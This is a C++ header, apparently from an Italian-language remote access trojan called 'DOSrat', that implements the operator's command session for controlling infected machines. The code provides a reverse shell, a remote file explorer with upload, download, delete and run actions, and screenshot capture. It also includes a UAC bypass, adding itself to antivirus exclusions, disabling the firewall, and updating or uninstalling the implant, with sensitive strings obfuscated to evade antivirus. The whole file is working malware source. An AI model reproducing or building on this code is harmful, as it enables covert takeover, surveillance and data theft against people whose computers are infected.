#pragma once

class Sessione
{
private:
    CLInterface cli;
    TextColor tc;
    DirUtils du;
    ConsoleUtils cu;
    SystemUtils su;

    bool CheckConnection()
    {
        TextColor tc;

        if (TcpIP::SendString(Sock, "checkconn"))
        {
            tc.SetColor(tc.Yellow);
            cout << "Errore di connessione temporaneo, riprova." << endl;
            tc.SetColor(tc.Default);

            return true;
        }

        tc.SetColor(tc.Red);
        cout << "Impossibile raggiungere il Client." << endl;
        tc.SetColor(tc.Default);

        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();

        Sleep(2000);
        return false;
    }

    bool GetInfo()
    {
        json j;
        VectString Header;
        VectString Body;
        string Response;

        Header.push_back("INFO");
        Header.push_back("VALORE");

        Response = COMUNICAZIONI::PingPong(Sock, "getinfo");

        if (Response == "")
            return false;

        j = json::parse(Response);

        Body.push_back("IP Wan");
        Body.push_back(Clients[ID].info.IP);

        Body.push_back("IP Lan");
        Body.push_back(j["IPL"]);

        Body.push_back("Nazione");
        Body.push_back(Clients[ID].info.Location.Country);

        Body.push_back("OS");
        Body.push_back(Clients[ID].info.OS);

        Body.push_back("UAC");
        Body.push_back(Clients[ID].info.UAC);

        Body.push_back("Percorso");
        Body.push_back(Clients[ID].info.InstallPath);

        Body.push_back("Versione");
        Body.push_back(Clients[ID].info.Versione);

        Body.push_back("Nome PC");
        Body.push_back(Clients[ID].info.PCname);

        Body.push_back("Nome Utente");
        Body.push_back(Clients[ID].info.UserName);

        Body.push_back("CPU %");
        Body.push_back(j["CPU"]);

        Body.push_back("RAM %");
        Body.push_back(j["RAM"]);

        Body.push_back("Finestra Attiva");
        Body.push_back(j["ACTWIN"]);

        Body.push_back("Data Installazione");
        Body.push_back(j["INSTDATE"]);

        cout << endl;
        cli.Table(Header, Body);
        cout << endl;

        return true;
    }

    bool Reconnect()
    {
        if (TcpIP::SendString(Sock, "reconnect"))
        {
            closesocket(Sock);
            Clients[ID].IsConnected = false;
            Clu->AggiornaTitolo();
            return true;
        }

        return false;
    }

    bool KillClient()
    {
        if (TcpIP::SendString(Sock, "kill"))
        {
            Sleep(1000);
            closesocket(Sock);
            Clients[ID].IsConnected = false;
            Clu->AggiornaTitolo();
            return true;
        }

        return false;
    }

    bool Shutdown()
    {
        if (TcpIP::SendString(Sock, "shutdown"))
        {
            cout << "Comando lanciato.\n" << endl;
            Sleep(1500);
            return true;
        }

        return false;
    }

    bool Reboot()
    {
        if (TcpIP::SendString(Sock, "reboot"))
        {
            cout << "Comando lanciato.\n" << endl;
            Sleep(1500);
            return true;
        }

        return false;
    }

    short UpdateClient()
    {
        bool Hidden = false;
        bool System = false;
        DWORD Attr;

        string FilePath = du.ChoseFileDialog("Client\0*.exe\0", du.GetModuleFilePath().c_str());

        if (FilePath == "")
            return 1;

        Attr = GetFileAttributesA(FilePath.c_str());
        if (Attr != -1)
        {
            Hidden = ((Attr & FILE_ATTRIBUTE_HIDDEN) == FILE_ATTRIBUTE_HIDDEN);
            System = ((Attr & FILE_ATTRIBUTE_SYSTEM) == FILE_ATTRIBUTE_SYSTEM);
        }

        cout << "Invio file in corso..." << endl;
        if (COMUNICAZIONI::UpdateClient(Sock, du.GetBinaryFileContent(FilePath), Hidden, System))
        {
            cout << "File inviato.\n" << endl;
            Sleep(1500);
            closesocket(Sock);
            Clients[ID].IsConnected = false;
            Clu->AggiornaTitolo();
            return 0;
        }

        return -1;
    }

    bool Uninstall()
    {
        if (TcpIP::SendString(Sock, "uninstall"))
        {
            Sleep(1000);
            closesocket(Sock);
            Clients[ID].IsConnected = false;
            Clu->AggiornaTitolo();
            return true;
        }

        return false;
    }

    bool RestartClient()
    {
        if (TcpIP::SendString(Sock, "restart"))
        {
            Sleep(1000);
            closesocket(Sock);
            Clients[ID].IsConnected = false;
            Clu->AggiornaTitolo();
            return true;
        }

        return false;
    }

    bool ReverseShell()
    {
        string Res = "";
        string Cmd = "";
        string Path = "";

        cout << endl;

        if (COMUNICAZIONI::PingPong(Sock, (string)AY_OBFUSCATE("reverseshell")) == "OK")
        {
            while (true)
            {
                Path = COMUNICAZIONI::PingPong(Sock, "Get cd");

                if (Path == "")
                    return false;

                cout << Path << ">";
                getline(cin, Cmd);

                if (StringUtils::ToLowerCase(Cmd).substr(0, 3) == "ftp")
                    cout << "Non supportato.\n" << endl;
                else if (StringUtils::ToLowerCase(Cmd).substr(0, 4) == "ping" && (StringUtils::ToLowerCase(Cmd).find("-t") != string::npos || StringUtils::ToLowerCase(Cmd).find("/t") != string::npos))
                    cout << "Non supportato.\n" << endl;
                else if (StringUtils::ToLowerCase(Cmd).substr(0, 3) == "cls")
                {
                    system("cls");
                    StampaTitolo(1);
                    cli.SubTitle("Sessione Comandi", 60, tc.Green);
                }
                else if (StringUtils::ToLowerCase(Cmd) == "powershell")
                {
                    cout << "Non puoi eseguire una sessione PS ma puoi lanciare singoli comandi preceduti da \"PowerShell\".\n" << endl;
                }
                else
                {
                    Res = COMUNICAZIONI::PingPong(Sock, Cmd);

                    if (Res == "")
                        return false;
                    else if (Res == (string)AY_OBFUSCATE("Reverse shell closed"))
                    {
                        cout << endl;
                        return true;
                    }

                    cout << Res;
                }
            }
        }

        return false;
    }

    short FileExplorer()
    {
        CliFileExplorer cfe;
        Encode en;
        string Res = "";
        json j;

        if (!cfe.PrintLayout())
        {
            cout << "Dimensioni della finestra insufficienti, ingrandisci la finestra e riprova." << endl;
            return 1;
        }

        Res = COMUNICAZIONI::PingPong(Sock, "fileexplorer");

        if (Res == "")
            return 2;

        cfe.FilesParse(json::parse(Res));
        cfe.UpdateContent();

        for (bool b = true; b;)
        {
            cu.SetCursorVisible(false);

            switch (_getch())
            {
                case 72: // UP
                {
                    cfe.UpdateSelection(false);
                    cfe.UpdateContent();
                    break;
                }

                case 80: // DOWN
                {
                    cfe.UpdateSelection(true);
                    cfe.UpdateContent();
                    break;
                }

                case 27: // ESC
                {
                    j.clear();

                    j["Action"] = "Exit";
                    TcpIP::SendString(Sock, j.dump());
                    b = false;
                    break;
                }

                case 13: // ENTER
                {
                    j.clear();

                    if (!cfe.CurrSelectionInfo().IsFile) // Directory
                    {
                        j["Action"] = "OpenDir";
                        j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);

                        cout << "Loading ";
                        cli.OneCharBar();

                        Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                        cli.StopBar();

                        if (Res == "")
                            return 2;
                        else if (Res != "denied")
                        {
                            cfe.FilesParse(json::parse(Res));
                            cfe.ResetSelection();
                            cfe.UpdateContent();
                        }
                        else
                        {
                            cfe.UpdateContent();
                            tc.SetColor(tc.Red);
                            cout << "Access denied.";
                            tc.SetColor(tc.Default);
                        }
                    }
                    else // File
                    {
                        j["Action"] = "RunFile";
                        j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);

                        Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                        if (Res == "")
                            return 2;
                        else
                        {
                            cfe.FilesParse(json::parse(Res));
                            cfe.UpdateContent();
                        }
                    }

                    cfe.ChangePartition = false;
                    break;
                }

                case 8: // BACKSPACE
                {
                    if (cfe.ChangePartition)
                    {
                        j.clear();

                        j["Action"] = "Refresh";

                        cout << "Loading ";
                        cli.OneCharBar();

                        Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                        cli.StopBar();

                        if (Res == "")
                            return 2;

                        cfe.FilesParse(json::parse(Res));
                        cfe.UpdateContent();

                        cfe.ChangePartition = false;
                        break;
                    }

                    j.clear();

                    j["Action"] = "GoUp";

                    cout << "Loading ";
                    cli.OneCharBar();

                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                    cli.StopBar();

                    if (Res == "")
                        return 2;
                    else if (Res != "denied")
                    {
                        cfe.FilesParse(json::parse(Res));
                        cfe.ResetSelection();
                        cfe.UpdateContent();
                    }
                    else
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Access denied.";
                        tc.SetColor(tc.Default);
                    }
                    break;
                }

                case 83: // DEL
                {
                    if (cfe.ChangePartition)
                        break;

                    j.clear();

                    j["Action"] = "Delete";
                    j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);
                    j["Type"] = cfe.CurrSelectionInfo().IsFile;

                    cout << "Loading ";
                    cli.OneCharBar();

                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                    cli.StopBar();

                    if (Res == "")
                        return 2;
                    else if (Res != "denied")
                    {
                        cfe.FilesParse(json::parse(Res));
                        cfe.UpdateContent();
                    }
                    else
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Permission denied.";
                        tc.SetColor(tc.Default);
                    }
                    break;
                }

                case 63: // F5
                {
                    if (cfe.ChangePartition)
                        break;

                    j.clear();

                    j["Action"] = "Refresh";

                    cout << "Loading ";
                    cli.OneCharBar();

                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                    cli.StopBar();

                    if (Res == "")
                        return 2;

                    cfe.FilesParse(json::parse(Res));
                    cfe.UpdateContent();

                    break;
                }

                case 114: // R
                {
                    if (cfe.ChangePartition)
                        break;

                    string NewName;

                    if (cfe.CurrSelectionInfo().Name == "..\\")
                        break;

                    cfe.UpdateContent();
                    cu.SetCursorVisible(true);
                    cout << "NewName: ";
                    getline(cin, NewName);
                    cfe.RealignVisual();

                    if (NewName == "")
                        break;

                    j.clear();

                    j["Action"] = "Rename";
                    j["OldName"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);
                    j["NewName"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().Path) + NewName;

                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                    if (Res == "")
                        return 2;
                    else if (Res != "denied")
                    {
                        cfe.FilesParse(json::parse(Res));
                        cfe.UpdateContent();
                    }
                    else
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Permission denied.";
                        tc.SetColor(tc.Default);
                    }
                    break;
                }

                case 117: // U
                {
                    if (cfe.ChangePartition)
                        break;

                    string LocalFile = du.ChoseFileDialog();
                    string FileName;

                    if (LocalFile == "")
                        break;

                    FileName = en.AsciiToUnicode(cfe.CurrSelectionInfo().Path) + LocalFile.substr(LocalFile.find_last_of("\\") + 1);

                    j.clear();
                    j["Action"] = "Upload";

                    if (!TcpIP::SendString(Sock, j.dump()))
                        return 2;

                    cfe.UpdateContent();
                    cout << "Uploading... ";

                    if (!COMUNICAZIONI::UploadFileWithLoading(Sock, FileName, du.GetBinaryFileContent(LocalFile), (cfe.FileNameSize + cfe.HelpSize + 2) - (string("Uploading... ").size() + 2)))
                        return 2;

                    cfe.RealignVisual();

                    if (!TcpIP::RecvString(Sock, Res))
                        return 2;

                    if (Res == "OK")
                    {
                        j.clear();
                        j["Action"] = "Refresh";

                        Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                        if (Res == "")
                            return 2;

                        cfe.FilesParse(json::parse(Res));
                        cfe.UpdateContent();
                    }
                    else if (Res == "denied")
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Permission denied.";
                        tc.SetColor(tc.Default);
                        break;
                    }
                    else
                        return 2;

                    break;
                }

                case 100: // D
                {
                    if (cfe.ChangePartition)
                        break;

                    string FileContent;
                    string FileName;
                    string LocalFolder = du.GetModuleFilePath() + Clients[ID].info.PCname + "_" + Clients[ID].info.UserName;

                    if (!cfe.CurrSelectionInfo().IsFile)
                    {
                        cfe.UpdateContent();
                        cout << "Please select a file, for directory use ZIP first.";
                        break;
                    }

                    j.clear();
                    j["Action"] = "Download";
                    j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);

                    if (!TcpIP::SendString(Sock, j.dump()))
                        return 2;

                    cfe.UpdateContent();
                    cout << "Downloading... ";

                    if (!COMUNICAZIONI::DownloadFileWithLoading(Sock, FileName, FileContent, (cfe.FileNameSize + cfe.HelpSize + 2) - (string("Downloading... ").size() + 2)))
                        return 2;

                    cfe.RealignVisual();
                    cfe.UpdateContent();

                    if (!du.CheckDir(LocalFolder))
                        if (!du.MakeDir(LocalFolder))
                        {
                            tc.SetColor(tc.Red);
                            cout << "Failed: unable to create local Client folder.";
                            tc.SetColor(tc.Default);
                            break;
                        }

                    LocalFolder += "\\Downloads";

                    if (!du.CheckDir(LocalFolder))
                        if (!du.MakeDir(LocalFolder))
                        {
                            tc.SetColor(tc.Red);
                            cout << "Failed: unable to create local downloads folder.";
                            tc.SetColor(tc.Default);
                            break;
                        }

                    if (!du.WriteBinaryFile(LocalFolder + "\\" + FileName, FileContent))
                    {
                        tc.SetColor(tc.Red);
                        cout << "Failed: unable to save local file.";
                        tc.SetColor(tc.Default);
                        break;
                    }

                    su.NoOutputCMD("start \"\" \"" + LocalFolder + "\"");

                    break;
                }

                case 109: // M
                {
                    if (cfe.ChangePartition)
                        break;

                    string DirName;

                    cfe.UpdateContent();
                    cu.SetCursorVisible(true);
                    cout << "Directory name: ";
                    getline(cin, DirName);
                    cfe.RealignVisual();

                    if (DirName == "")
                        break;

                    j.clear();

                    j["Action"] = "Makedir";
                    j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().Path) + DirName;

                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                    if (Res == "")
                        return 2;
                    else if (Res != "denied")
                    {
                        cfe.FilesParse(json::parse(Res));
                        cfe.UpdateContent();
                    }
                    else
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Permission denied.";
                        tc.SetColor(tc.Default);
                    }
                    break;
                }

                case 102: // F
                {
                    if (cfe.ChangePartition)
                        break;

                    string FileName;

                    cfe.UpdateContent();
                    cu.SetCursorVisible(true);
                    cout << "File name: ";
                    getline(cin, FileName);
                    cfe.RealignVisual();

                    if (FileName == "")
                        break;

                    j.clear();

                    j["Action"] = "Makefile";
                    j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().Path) + FileName;

                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                    if (Res == "")
                        return 2;
                    else if (Res != "denied")
                    {
                        cfe.FilesParse(json::parse(Res));
                        cfe.UpdateContent();
                    }
                    else
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Permission denied.";
                        tc.SetColor(tc.Default);
                    }
                    break;
                }

                case 120: // X
                {
                    if (cfe.ChangePartition)
                        break;

                    if (cfe.CurrSelectionInfo().Name != "..\\")
                    {
                        cfe.CutCopy.CutOrCopy = false;
                        cfe.CutCopy.IsFile = cfe.CurrSelectionInfo().IsFile;
                        cfe.CutCopy.PathToCutCopy = cfe.CurrSelectionInfo().FullPath;
                        cfe.CutCopy.Name = cfe.CurrSelectionInfo().Name;
                        cfe.UpdateContent();
                    }
                    break;
                }

                case 99: // C
                {
                    if (cfe.ChangePartition)
                        break;

                    if (cfe.CurrSelectionInfo().Name != "..\\")
                    {
                        cfe.CutCopy.CutOrCopy = true;
                        cfe.CutCopy.IsFile = cfe.CurrSelectionInfo().IsFile;
                        cfe.CutCopy.PathToCutCopy = cfe.CurrSelectionInfo().FullPath;
                        cfe.CutCopy.Name = cfe.CurrSelectionInfo().Name;
                        cfe.UpdateContent();
                    }
                    break;
                }

                case 118: // V
                {
                    if (cfe.ChangePartition)
                        break;

                    if (cfe.CutCopy.PathToCutCopy == "")
                        break;

                    j.clear();

                    j["Action"] = "CopyCut";
                    j["CutOrCopy"] = cfe.CutCopy.CutOrCopy;
                    j["Type"] = cfe.CutCopy.IsFile;
                    j["Path"] = en.AsciiToUnicode(cfe.CutCopy.PathToCutCopy);
                    j["Name"] = en.AsciiToUnicode(cfe.CutCopy.Name);

                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                    if (Res == "")
                        return 2;
                    else if (Res != "denied")
                    {
                        if (!cfe.CutCopy.CutOrCopy)
                            cfe.CutCopy.PathToCutCopy = "";

                        cfe.FilesParse(json::parse(Res));
                        cfe.UpdateContent();
                    }
                    else
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Permission denied.";
                        tc.SetColor(tc.Default);
                    }

                    break;
                }

                case 112: // P
                {
                    j.clear();

                    j["Action"] = "ChangePartition";

                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                    if (Res == "")
                        return 2;

                    cfe.FilesParse(json::parse(Res));
                    cfe.ResetSelection();
                    cfe.UpdateContent();
                    cfe.ChangePartition = true;

                    break;
                }

                case 122: // Z
                {
                    if (cfe.ChangePartition || cfe.CurrSelectionInfo().Name == "..\\")
                        break;

                    j.clear();

                    j["Action"] = (StringUtils::ToLowerCase(cfe.CurrSelectionInfo().Name.substr(cfe.CurrSelectionInfo().Name.size() - 4)) == ".zip") ? "Unzip" : "Zip";
                    j["Path"] = en.AsciiToUnicode(cfe.CurrSelectionInfo().FullPath);
                    j["Name"] = (cfe.CurrSelectionInfo().IsFile) ? en.AsciiToUnicode(cfe.CurrSelectionInfo().Name) : en.AsciiToUnicode(cfe.CurrSelectionInfo().Name.substr(0, cfe.CurrSelectionInfo().Name.size() - 1));

                    cout << "Loading ";
                    cli.OneCharBar();

                    Res = COMUNICAZIONI::PingPong(Sock, j.dump());

                    cli.StopBar();

                    if (Res == "")
                        return 2;
                    else if (Res != "denied")
                    {
                        cfe.FilesParse(json::parse(Res));
                        cfe.UpdateContent();
                    }
                    else
                    {
                        cfe.UpdateContent();
                        tc.SetColor(tc.Red);
                        cout << "Permission denied.";
                        tc.SetColor(tc.Default);
                    }
                    break;
                }

                default:
                    break;
            }
        }

        cu.SetCursorVisible(true);
        return 0;
    }

    short BypassUAC()
    {
        cout << "Tentativo in corso..." << endl;

        string Res = COMUNICAZIONI::PingPong(Sock, (string)AY_OBFUSCATE("bypassuac"));

        if (Res == "")
        {
            Sleep(1000);
            TcpIP::RecvString(Sock, Res);
        }

        if (Res == "OK")
        {
            tc.SetColor(tc.Lime);
            cout << AY_OBFUSCATE("Bypass eseguito, riavvio del Client in corso...\n") << endl;
            tc.SetColor(tc.Default);
            Sleep(1500);
            closesocket(Sock);
            Clients[ID].IsConnected = false;
            Clu->AggiornaTitolo();
            return 0;
        }
        else if (Res == "NO")
        {
            tc.SetColor(tc.Yellow);
            cout << AY_OBFUSCATE("Bypass non riuscito.\n") << endl;
            tc.SetColor(tc.Default);
            return 1;
        }

        tc.SetColor(tc.Red);
        cout << "Operazione bloccata dall'AV.\n" << endl;
        tc.SetColor(tc.Default);

        return 2;
    }

    bool InvertMouse()
    {
        string Status;

        Status = COMUNICAZIONI::PingPong(Sock, "invertmouse");

        if (Status == "a")
            cout << "Tasti invertiti.\n" << endl;
        else if (Status == "b")
            cout << "Tasti normali.\n" << endl;
        else
            return false;

        return true;
    }

    bool VibeMouse()
    {
        string Status;

        Status = COMUNICAZIONI::PingPong(Sock, "vibemouse");

        if (Status == "a")
            cout << "Vibrazione attivata.\n" << endl;
        else if (Status == "b")
            cout << "Vibrazione disattivata.\n" << endl;
        else
            return false;

        return true;
    }

    bool AddAVexclusion()
    {
        string Status;

        Status = COMUNICAZIONI::PingPong(Sock, "addexclusion");

        if (Status == "ok")
        {
            tc.SetColor(tc.Lime);
            cout << "Client aggiunto alle esclusioni dell'AV.\n" << endl;
            tc.SetColor(tc.Default);
        }
        else if (Status == "ko")
        {
            tc.SetColor(tc.Red);
            cout << "Errore durante l'aggiunta del Client alle esclusioni.\n" << endl;
            tc.SetColor(tc.Default);
        }
        else
            return false;

        return true;
    }

    bool DisableFirewall()
    {
        string Status;

        Status = COMUNICAZIONI::PingPong(Sock, "disablefw");

        if (Status == "ok")
        {
            tc.SetColor(tc.Lime);
            cout << "Firewall disabilitato.\n" << endl;
            tc.SetColor(tc.Default);
        }
        else if (Status == "ko")
        {
            tc.SetColor(tc.Red);
            cout << "Errore durante l'operazione.\n" << endl;
            tc.SetColor(tc.Default);
        }
        else
            return false;

        return true;
    }

    bool Screenshot()
    {
        string FileContent;
        string FileName = DateTime::GetDateTime('-', '_', '.') + ".jpg";
        string LocalFolder = du.GetModuleFilePath() + Clients[ID].info.PCname + "_" + Clients[ID].info.UserName;

        cout << "Cattura in corso..." << endl;

        FileContent = COMUNICAZIONI::PingPong(Sock, "screenshot");

        if (FileContent == "")
            return false;

        cout << "Immagine ricevuta!\n" << endl;

        if (!du.CheckDir(LocalFolder))
            if (!du.MakeDir(LocalFolder))
            {
                tc.SetColor(tc.Red);
                cout << "Failed: unable to create local Client folder.";
                tc.SetColor(tc.Default);
                return true;
            }

        LocalFolder += "\\Screenshots";

        if (!du.CheckDir(LocalFolder))
            if (!du.MakeDir(LocalFolder))
            {
                tc.SetColor(tc.Red);
                cout << "Failed: unable to create local Screenshots folder.";
                tc.SetColor(tc.Default);
                return true;
            }

        FileContent = decompress_string(FileContent);

        if (!du.WriteBinaryFile(LocalFolder + "\\" + FileName, FileContent))
        {
            tc.SetColor(tc.Red);
            cout << "Failed: unable to save local file.";
            tc.SetColor(tc.Default);
            return true;
        }

        su.NoOutputCMD("start \"\" \"" + LocalFolder + "\\" + FileName + "\"");

        return true;
    }

public:
    SOCKET Sock;
    int ID;

    void AvviaSessione()
    {
        string cmd;

        system("cls");
        StampaTitolo(1);
        cli.SubTitle("Sessione Comandi", 60, tc.Green);

        for (bool Controllo = true; Controllo;)
        {
            StampaPrefix(Clients[ID].info.PCname, Clients[ID].info.UserName);
            getline(cin, cmd);
            cmd = StringUtils::ToLowerCase(cmd);

            Clients[ID].InTask = true;
            Sleep(100);

            if (cmd == "help")
            {
                cout << endl;
                cli.SubTitle("Client", 30, tc.Blue);
                StampaHelp("Reconnect\t", "- Scollega e ricollega il Client a DOSrat ma senza riavviarlo.");
                StampaHelp("Kill\t\t", "- Termina il processo del Client.");
                StampaHelp("Update\t\t", "- Aggiorna il Client con un eseguibile locale.");
                StampaHelp("Uninstall\t", "- Disinstalla il Client dal PC remoto.");
                StampaHelp("Restart\t\t", "- Termina il Client e lo riavvia.");
                cout << endl;

                cli.SubTitle("System", 30, tc.Lime);
                StampaHelp("Getinfo\t\t", "- Ottieni informazioni sul PC e sul Client.");
                StampaHelp("Shutdown\t", "- Spegne il PC.");
                StampaHelp("Reboot\t\t", "- Riavvia il PC.");
                StampaHelp((string)AY_OBFUSCATE("Revshell\t"), "- Lancia comandi sulla shell del PC remoto.");
                StampaHelp("Explorer\t", "- Gestisci i file del PC remoto.");
                StampaHelp((string)AY_OBFUSCATE("BypassUAC\t"), (string)AY_OBFUSCATE("- Prova a bypassare l'UAC e ottenere privilegi amministrativi."));
                StampaHelp("AddAVexclusion\t", "- Aggiunge il Client alle esclusioni dell'AV (solo se Admin).");
                StampaHelp((string)AY_OBFUSCATE("DisableFirewall\t"), (string)AY_OBFUSCATE("- Disabilita il Firewall (solo se Admin)."));
                cout << endl;

                cli.SubTitle("Desktop", 30, tc.SkyBlue);
                StampaHelp("Screenshot\t", "- Scarica uno screenshot del desktop.");
                cout << endl;

                cli.SubTitle("Fun", 30, tc.Yellow);
                StampaHelp("Invertmouse\t", "- Inverte i tasti del mouse.");
                StampaHelp("Vibemouse\t", "- Fa vibrare il puntatore del mouse.");
                cout << endl;

                cli.SubTitle("Utility", 30, tc.Purple);
                StampaHelp("Exit\t", "- Torna al menu principale.");
                StampaHelp("Clear\t", "- Pulisce la console da tutti i comandi precedenti.");
                StampaHelp("Help\t", "- Mostra la lista dei comandi.");
                cout << endl;
            }
            else if (cmd == "getinfo")
            {
                if (!GetInfo())
                    Controllo = CheckConnection();
            }
            else if (cmd == "invertmouse")
            {
                if (!InvertMouse())
                    Controllo = CheckConnection();
            }
            else if (cmd == "exit" || cmd == "close")
            {
                Controllo = false;
            }
            else if (cmd == "reconnect")
            {
                if (!Reconnect())
                    Controllo = CheckConnection();
                else
                    Controllo = false;
            }
            else if (cmd == "clear" || cmd == "cls")
            {
                system("cls");
                StampaTitolo(1);
                cli.SubTitle("Sessione Comandi", 60, tc.Green);
            }
            else if (cmd == "kill")
            {
                if (!KillClient())
                    Controllo = CheckConnection();
                else
                    Controllo = false;
            }
            else if (cmd == "shutdown")
            {
                if (!Shutdown())
                    Controllo = CheckConnection();
                else
                    Controllo = false;
            }
            else if (cmd == "reboot")
            {
                if (!Reboot())
                    Controllo = CheckConnection();
                else
                    Controllo = false;
            }
            else if (cmd == "update")
            {
                switch (UpdateClient())
                {
                    case -1: Controllo = CheckConnection(); break;
                    case 0: Controllo = false; break;
                    case 1: break;
                }
            }
            else if (cmd == "uninstall")
            {
                if (!Uninstall())
                    Controllo = CheckConnection();
                else
                    Controllo = false;
            }
            else if (cmd == "restart")
            {
                if (!RestartClient())
                    Controllo = CheckConnection();
                else
                    Controllo = false;
            }
            else if (cmd == (string)AY_OBFUSCATE("revshell"))
            {
                if (!ReverseShell())
                    Controllo = CheckConnection();
            }
            else if (cmd == "explorer")
            {
                if (Clients[ID].info.CompatibleVer < 1)
                    StampaIncompatibile();
                else
                {
                    switch (FileExplorer())
                    {
                        case 0:
                            system("cls");
                            StampaTitolo(1);
                            cli.SubTitle("Sessione Comandi", 60, tc.Green);
                            break;

                        case 1:
                            break;

                        case 2:
                            system("cls");
                            StampaTitolo(1);
                            cli.SubTitle("Sessione Comandi", 60, tc.Green);

                            Controllo = CheckConnection();
                            break;
                    }
                }
            }
            else if (cmd == (string)AY_OBFUSCATE("bypassuac"))
            {
                if (Clients[ID].info.CompatibleVer < 2)
                    StampaIncompatibile();
                else
                {
                    if (Clients[ID].info.UAC == "Admin")
                        cout << "Il Client e' gia' amministratore." << endl;
                    else
                        switch (BypassUAC())
                        {
                            case 0:
                                Controllo = false;
                                break;

                            case 1:
                                break;

                            case 2:
                                Controllo = CheckConnection();
                                break;
                        }
                }
            }
            else if (cmd == "vibemouse")
            {
                if (Clients[ID].info.CompatibleVer < 3)
                    StampaIncompatibile();
                else
                {
                    if (!VibeMouse())
                        Controllo = CheckConnection();
                }
            }
            else if (cmd == "addavexclusion")
            {
                if (Clients[ID].info.CompatibleVer < 4)
                    StampaIncompatibile();
                else
                {
                    if (Clients[ID].info.UAC == "Admin")
                    {
                        if (!AddAVexclusion())
                            Controllo = CheckConnection();
                    }
                    else
                        cout << "\nIl Client non dispone di privilegi necessari per eseguire l'operazione." << endl;
                }
            }
            else if (cmd == (string)AY_OBFUSCATE("disablefirewall"))
            {
                if (Clients[ID].info.CompatibleVer < 4)
                    StampaIncompatibile();
                else
                {
                    if (Clients[ID].info.UAC == "Admin")
                    {
                        if (!DisableFirewall())
                            Controllo = CheckConnection();
                    }
                    else
                        cout << "\nIl Client non dispone di privilegi necessari per eseguire l'operazione." << endl;
                }
            }
            else if (cmd == "screenshot")
            {
                if (Clients[ID].info.CompatibleVer < 4)
                    StampaIncompatibile();
                else
                {
                    if (!Screenshot())
                        Controllo = CheckConnection();
                }
            }
            else
            {
                cout << "\"" << cmd << "\" non e' un comando valido, usa \"help\" per la lista di tutti i comandi." << endl;
            }

            Clients[ID].InTask = false;
        }
    }
};